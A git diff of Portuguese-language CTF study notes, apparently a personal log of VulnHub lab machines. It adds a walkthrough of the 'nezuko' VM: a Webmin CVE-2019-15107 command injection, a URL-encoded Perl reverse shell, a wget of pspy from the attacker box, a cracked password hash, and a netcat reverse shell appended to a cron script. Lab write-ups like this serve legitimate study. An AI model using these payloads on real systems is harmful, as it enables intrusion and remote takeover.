@@ -16,8 +16,9 @@ Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
 Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
 Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
 Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
-Desafio 17 - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
-Desafio 18 - </br>
+Desafio 17 - Manual Webmin 1.920 exploit | CVE-2019-15107 | Crontab - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
+Desafio 18 - https://www.vulnhub.com/entry/typhoon-102,267/ </br>
+Desafio 19 - -</br>
 <br/>**--VM--**
 	
 	
@@ -719,3 +720,65 @@ Desafio 18 - </br>
 			p=subprocess.call(["/bin/sh","-i"]);
 				
 		*nc -lnvp 443 	-> aguardar a conexão
+
+
+<h3>Dia 17 			23/9/2020</h3>
+	
+	*scan -sV -p-
+		13337 -> webmin
+			https://10.0.0.7:13337/
+				#aceitar risco e continuar 
+				
+	*searsploit webmin
+		searchsploit -m 47293.sh
+		#cat 47293.sh
+		
+		#ifconfig																
+		curl -ks https://10.0.0.7:13337/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id| ifconfig &new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer:  https://10.0.0.7:13337/session_login.cgi''
+	
+	*burp
+		https://10.0.0.7:13337/password_change.cgi
+		
+		
+			POST /password_change.cgi HTTP/1.1 -> apenas alterar o metodo de GET para POST caso esteja
+		adicionar o 
+			user=wheel&pam=&expired=2&old=id| ifconfig &new1=wheel&new2=wheel 
+		no final
+		
+		#send modo render
+		
+		#nc -lnvp 443
+		#encodar uma shell em url e por no lugar do ifconfig
+			user=wheel&pam=&expired=2&old=id|			%70%65%72%6c%20%2d%65%20%27%75%73%65%20%53%6f%63%6b%65%74%3b%24%69%3d%22%31%30%2e%30%2e%30%2e%34%22%3b%24%70%3d%34%34%33%3b%73%6f%63%6b%65%74%28%53%2c%50%46%5f%49%4e%45%54%2c%53%4f%43%4b%5f%53%54%52%45%41%4d%2c%67%65%74%70%72%6f%74%6f%62%79%6e%61%6d%65%28%22%74%63%70%22%29%29%3b%69%66%28%63%6f%6e%6e%65%63%74%28%53%2c%73%6f%63%6b%61%64%64%72%5f%69%6e%28%24%70%2c%69%6e%65%74%5f%61%74%6f%6e%28%24%69%29%29%29%29%7b%6f%70%65%6e%28%53%54%44%49%4e%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%4f%55%54%2c%22%3e%26%53%22%29%3b%6f%70%65%6e%28%53%54%44%45%52%52%2c%22%3e%26%53%22%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%22%29%3b%7d%3b%27 &new1=wheel&new2=wheel
+			
+		*python -c 'import pty;pty.spawn("/bin/bash")'
+			
+		*pspy
+			kali: pythom -m SimpleHTTPServer 8080
+			nc: wget http://10.0.0.4:8081/pspy-master
+
+			chmod +x pspy-master
+			./pspy-master
+			
+				#/usr/sbin/CRON -f 
+				#send_message_to_nezuko.sh
+
+
+			
+		*nc
+			cd /home/zenitsu/to_nezuko	
+			cat send_message_to_nezuko.sh
+			
+			#cat /etc/passwd
+				hash do nezujo -> copiar para um arquivo -> john arquivo_com_hash
+				zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash
+
+	password:  meowmeow
+			
+			#su zenitsu
+			pass: meowmeow
+			
+			#nc -lnvp 80			
+			#echo “nc 10.0.0.4 80 -e /bin/bash” >> send_message_to_nezuko.sh
+			
+			Basta esperar pois como visto no pspy, a x tempo é executado um comando relacionado ao send_message_to_nezuko.sh, então adicionando o nc 10.0.0.4 80 -e /bin/bash, em algum momento ele irá se conectar ao kali pelo nc
